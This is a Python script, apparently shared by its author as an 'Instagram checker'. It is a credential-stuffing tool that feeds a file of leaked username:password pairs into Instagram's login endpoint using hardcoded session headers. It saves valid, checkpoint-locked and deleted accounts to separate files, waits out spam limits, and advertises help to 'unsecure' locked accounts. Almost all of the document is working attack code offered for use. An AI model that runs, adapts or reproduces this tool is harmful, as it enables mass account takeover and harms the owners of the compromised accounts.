

from os import system as cmd

try:
    from time import sleep
    import requests
    from colored import fg, bg, attr
    red = fg("#ff0000")
    green = fg("#07c85f") 
    sec = fg("#0000c5") 
    print("""
𝖎𝖓𝖘𝖙𝖆𝖌𝖗𝖆𝖒 𝖈𝖍𝖊𝖈𝖊𝖐𝖗/instagram checker
  ___ ____    ____ _   _ _____ ____ _  _______ ____  
 |_ _/ ___|  / ___| | | | ____/ ___| |/ / ____|  _ \ 
  | | |  _  | |   | |_| |  _|| |   | ' /|  _| | |_) |
  | | |_| | | |___|  _  | |__| |___| . \| |___|  _ < 
 |___\____|  \____|_| |_|_____\____|_|\_\_____|_| \_\\
                                                     

                                𝓉𝒽𝒶𝓉 𝓉𝑜𝑜𝓁 𝓂𝒶𝒹𝑒 𝒷𝓎 @𝒾𝟢𝓍𝒷𝟦𝒹/thats tool  made by @i0xb4d   
    """)
    combo_file = input("enter the combo path:>")
    combo_fileo = open(combo_file, 'r',encoding="utf8").read().splitlines()
    savef_s = open('secure.txt', 'a', encoding="utf8")
    savefile_delet = open('banned_delete.txt', 'a', encoding="utf8")
    log_ddon = open('av_user.txt', 'a', encoding="utf8")





    def Login(user33,pass22):
        r1 = requests.session()
        url = 'https://www.instagram.com/accounts/login/ajax/'
        head = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '275',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=303991DA-0420-41AC-A26D-D9F27C8DF624; mid=X0padwAEAAEPS5xI4RZu1YV6z7zS; rur=ASH; csrftoken=xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6; urlgen="{"185.88.26.35": 201031}:1kC1CG:D41DVXmf-j-T5nYho3c7g7K3MQU"',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
        'x-csrftoken': 'xX0K5q7XikrU1LAnenqEVKqb7J3qK4S6',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3tv9HzzLkZIUlGMRu3lzHfEeePw9CgWg8cuXGO22LfU8x0',
        'x-instagram-ajax': '0c15f4d7d44a',
        'x-requested-with': 'XMLHttpRequest'
        }
        data = {
        'username': f'{user33}',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{str(pass22)}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
        }
        Log = r1.post(url, data=data, headers=head, timeout=15)
        if "checkpoint_required" in Log.text:
            print(sec+ f"""

-----------------------------------------------------------------
Account status : secure [!]
User: {user33}
Account password: {str(pass22)}
want to unsecure it ?
talk to me in instagram => https://www.instagram.com/i0xb4d [+]
-----------------------------------------------------------------

            """)
            savef_s.write(f"""
            {user33}:{pass22}
            """)
        elif "userId" in Log.text:
            print(green + f"""

-----------------------------------------------------------------
Account status : nice [+]
User: {user33}
Account password: {str(pass22)}

You can login to account without any problem
-----------------------------------------------------------------

            """)
            log_ddon.write(f"""
            {user33}:{pass22}
            """)
        elif '"authenticated":false' and '"user":true' in Log.text:
            print(red + f"""

-----------------------------------------------------------------            
Account status : bad pass [+]
User: {user33}
Account password[not correct]: {pass22}

You cant login to account because the password wrong [!]
-----------------------------------------------------------------

            """)
        elif "spam"  in Log.text:
            print(red + f"""
--------------------------------------------------------------------
bypass spam wait 10m [dont close the tools it will continue soon..]
--------------------------------------------------------------------
            """)
            sleep(600)
        elif "secure" in Log.text:
            print(red + f"""

-----------------------------------------------------------------
Sad ); 
instagram security stopped your spamming requests [!]
try to use vpn or wait for 
version v2.0 with proxy list type [-]
-----------------------------------------------------------------
            
            """)
        elif '"user":false' in Log.text:
            print(red + f"""

-----------------------------------------------------------------            
Account status : banned or deleted user [+]
User: {user33}
password: {pass22}

You cant login to account because the user was removed [!]
-----------------------------------------------------------------

            """)
            
            savefile_delet.write(f"""
            {user33}:{pass22}
            """)

    a5 = 0
    a4 = 0
    for e in range(len(combo_fileo)):
        comb = combo_fileo[a4]
        def user2(comb):
        
    
            l = len(comb)
            usergen = ""
            w2 = 0
            for w in range(l):
                w3 = comb[w2]
                if w3 != ':':
                    usergen += w3
                    w2 = w2 + 1
                    

            return usergen
        def pass2(comb):
            l = len(comb)
            len2 = 0
            w2 =0
            a2 = 0
    
            while a2 != l:
                w3 = comb[w2]
                if w3 != ':':
                    len2 += 1
                    w2 = w2 + 1
                else:
                    len2 += 1
                    a2 = a2 - a2 + l
            passgen = ""
            conrng = len(comb) - len2 -1
            for w5 in range(conrng+1):
                passgen += comb[len2]
                len2 += 1
            return passgen
        user32 = user2(comb)
        user33 = user32[1:]
        pass22 = pass2(comb)
        Login(user33,pass22)
        sleep(10)
        a4 += 1
except KeyboardInterrupt:
    print("""
thanks for using my tool 
have a nice day!
instagram: i0xb4d
    """)
except FileNotFoundError:
    print("""
enter a logic path 
check your input[!]
instagram: i0xb4d
    """)
except ModuleNotFoundError:
    print("""
some modules arent founding....
download the modules...

    """)
    try:
        cmd("pip install requests")
        cmd("pip install time")
        cmd("pip install colored")
        try:
            cmd("cls")
        except:
            cmd("clear")
        cmd("python IG_CHECKER.py")
    except:
        pt = input("linux or windows?")
        if pt == "windows":
            cmd('curl "https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe"')
            cmd('python-3.10.2-amd64.exe')
        elif pt == "linux":
            pt2 = input("parrot/kali/black_arch/other_p(os)=>[must use apt]")
            if pt2 == "parrot":
                cmd("sudo apt install python")
            elif pt2 == "kali":
                cmd("sudo apt install python")
            elif pt2 == "black_arch":
                cmd("sudo pacman -S  python")
            else:
                cmd("sudo apt install python")
        else:
            print("check your input...")
except TypeError:
    print("""
check your input [!]
or just the progrss done [+]
instagram @i0xb4d for more help
    """)
except IndexError:
    print("""
checker done [+]
if checker do not check any user 
check your input [!]

instagram @i0xb4d for more help
    """)

else:
    print("""
other error founding [!]

instagram @i0xb4d for more help
    """)
